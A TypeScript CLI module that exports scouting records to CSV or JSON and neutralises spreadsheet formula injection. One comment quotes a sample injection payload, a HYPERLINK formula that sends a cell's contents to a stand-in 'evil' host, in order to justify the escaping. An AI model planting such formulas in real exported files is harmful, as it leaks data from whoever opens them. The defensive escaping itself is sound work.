/**
 * `courier extract` — give the team their data back.
 *
 * Without this, Courier is a roach motel: scouting goes in, and the only things
 * that come out are the two reports this repo happens to have written. That is
 * precisely the trap every predecessor fell into. The research finding that
 * shaped this whole project is that teams diverge ON PURPOSE — they treat
 * differing data as competitive advantage and mentors use app-building as
 * curriculum — so a tool that only hands back its own opinions is a tool that
 * gets replaced by a spreadsheet.
 *
 * Courier's job is to MOVE the data. What a team does with it afterwards is
 * their business, and their existing spreadsheet, dashboard or homegrown web
 * app needs CSV or JSON, not a formatted picklist.
 *
 * ── Nothing disappears quietly ──────────────────────────────────────────────
 * Every record in the current view produces exactly one row, decoded or not.
 * An undecodable record keeps its routing fields and reports `decoded=false`
 * with empty values rather than vanishing, because a CSV that is quietly
 * shorter than the store is the failure mode that never gets noticed. Pass
 * `--decoded-only` to opt out.
 */

import { readFileSync, writeFileSync } from 'node:fs';
import { matchLabel } from '@courier/core';
import { DecoderRegistry, describeGaps, loadSchema, type BodySchema } from '@courier/decode';
import { Workspace } from './workspace.ts';
import type { CommandResult } from './commands.ts';

const ok = (text: string): CommandResult => ({ text, code: 0 });
const fail = (text: string): CommandResult => ({ text, code: 1 });

export type ExtractFormat = 'csv' | 'json';

export interface ExtractArgs {
  readonly schemaPath: string;
  readonly format?: ExtractFormat;
  /** Where to write. Omitted means stdout, so this pipes. */
  readonly out?: string;
  readonly decodedOnly?: boolean;
  readonly readFile?: (p: string) => string;
  readonly writeFile?: (p: string, data: string) => void;
}

/**
 * Fields Excel and Google Sheets will execute as a formula if they lead a cell.
 *
 * A scouting note reading `=1+1` is harmless; `=HYPERLINK("http://evil/"&A1)`
 * in a file a team opens without thinking is not, and the body of a record is
 * attacker-controlled text from whatever app produced the QR code. The standard
 * mitigation is a leading apostrophe, which the spreadsheet strips on display.
 */
const FORMULA_LEAD = /^[=+\-@\t\r]/;

function csvCell(v: string | number | boolean | undefined): string {
  if (v === undefined) return '';
  let s = String(v);
  if (FORMULA_LEAD.test(s)) s = `'${s}`;
  return /["',\n\r]/.test(s) ? `"${s.replaceAll('"', '""')}"` : s;
}

export function extract(ws: Workspace, args: ExtractArgs): CommandResult {
  if (!ws.exists) return fail(`no workspace at ${ws.dir} — run "courier init" first`);

  const read = args.readFile ?? ((p: string) => readFileSync(p, 'utf8'));
  const write = args.writeFile ?? ((p: string, d: string) => writeFileSync(p, d));
  const format: ExtractFormat = args.format ?? 'csv';

  let schema: BodySchema;
  try {
    schema = loadSchema(JSON.parse(read(args.schemaPath)));
  } catch (err) {
    return fail(`could not load the schema: ${(err as Error).message}`);
  }
  const registry = DecoderRegistry.from([schema]);

  const store = ws.store();
  if (store.size === 0) return fail('no records yet. Run "courier ingest" first.');

  // D-25: the current view. The log keeps superseded revisions so peers can
  // still reconcile; an export of "what we observed" must not carry the typo
  // and its correction as two rows.
  const stored = store.currentRecords();
  const superseded = store.size - stored.length;

  const columns = schema.fields.map((f) => f.name);
  interface Row {
    event: string;
    match: string;
    team: number;
    scout: string;
    schemaId: string;
    decoded: boolean;
    values: Record<string, string | number | boolean | undefined>;
  }

  const rows: Row[] = [];
  let undecoded = 0;

  for (const s of stored) {
    const r = s.record;
    const result = registry.decode(r.schema, r.body);
    const decoded = result !== null && result.decoded;
    if (!decoded) undecoded++;
    if (!decoded && args.decodedOnly) continue;

    const values: Record<string, string | number | boolean | undefined> = {};
    if (result !== null && result.decoded) {
      for (const c of columns) values[c] = result.values[c];
    }
    rows.push({
      event: r.eventKey,
      match: matchLabel(r.match),
      team: r.team,
      scout: hex(r.scout),
      schemaId: r.schema,
      decoded,
      values,
    });
  }

  // Stable across devices: the store's current view is already ordered, but
  // sort explicitly so an export diffed between two laptops lines up.
  rows.sort(
    (a, b) =>
      a.event.localeCompare(b.event) ||
      a.match.localeCompare(b.match, undefined, { numeric: true }) ||
      a.team - b.team ||
      a.scout.localeCompare(b.scout),
  );

  const body =
    format === 'json'
      ? JSON.stringify(
          rows.map((r) => ({
            event: r.event,
            match: r.match,
            team: r.team,
            scout: r.scout,
            schema: r.schemaId,
            decoded: r.decoded,
            ...Object.fromEntries(columns.map((c) => [c, r.values[c] ?? null])),
          })),
          null,
          2,
        ) + '\n'
      : [
          ['event', 'match', 'team', 'scout', 'schema', 'decoded', ...columns]
            .map(csvCell)
            .join(','),
          ...rows.map((r) =>
            [r.event, r.match, r.team, r.scout, r.schemaId, r.decoded, ...columns.map((c) => r.values[c])]
              .map(csvCell)
              .join(','),
          ),
        ].join('\n') + '\n';

  if (args.out) write(args.out, body);

  const notes: string[] = [];
  if (args.out) {
    notes.push(`Wrote ${rows.length} row(s) to ${args.out} as ${format.toUpperCase()}.`);
  }
  if (superseded > 0) {
    notes.push(`${superseded} superseded revision(s) excluded — the corrections are what you have.`);
  }
  if (undecoded > 0) {
    notes.push(
      args.decodedOnly
        ? `${undecoded} record(s) could not be decoded and were LEFT OUT because you asked for` +
            ' --decoded-only. They are still in the store and will still sync.'
        : `${undecoded} record(s) could not be decoded. They are present with decoded=false and` +
            ' empty values rather than dropped, so the row count matches the store.',
    );
  }
  const gaps = describeGaps(registry.decodeAll(stored), stored.length);
  if (gaps) notes.push('', gaps);

  notes.push(
    '',
    'Scout ids are per-event pseudonyms. If the app that produced these QR codes writes the',
    'scout\'s own name into the body, that name is in a column here too — the pseudonym does',
    'not retract it. Check before sharing the file.',
  );

  // Drop separator blanks that lead the list when nothing preceded them, so a
  // clean run does not open with an empty line.
  while (notes.length > 0 && notes[0] === '') notes.shift();

  // With no --out the data goes to stdout so this pipes, and the notes would
  // corrupt it. The caller prints them to stderr instead.
  return args.out ? ok(notes.join('\n')) : { text: body, code: 0, stderr: notes.join('\n') };
}

function hex(b: Uint8Array): string {
  let s = '';
  for (const x of b) s += x.toString(16).padStart(2, '0');
  return s;
}
